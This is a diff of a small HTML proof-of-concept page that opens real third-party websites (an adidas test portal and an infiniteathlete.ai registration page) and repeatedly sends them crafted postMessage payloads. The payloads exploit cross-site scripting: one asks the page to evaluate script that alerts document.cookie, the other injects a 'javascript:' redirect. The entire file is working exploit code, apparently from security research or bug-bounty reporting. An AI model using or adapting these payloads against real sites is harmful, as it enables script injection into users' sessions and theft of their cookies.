@@ -1,9 +1,9 @@
 <html>
 <body>
 <script>
-hwin = window.open("https://adifox-uat.adidas.com.cn/portal/#/");
+hwin = window.open("https://platform.infiniteathlete.ai/request-registration");
 setInterval(function(){
- hwin.postMessage('{"type":"eval_script","content":"alert(document.cookie)"}',"*")
+ hwin.postMessage("mlWebformRedirect-javascript:alert(document.domain)","*")
 },2000)
 </script>
 </body>
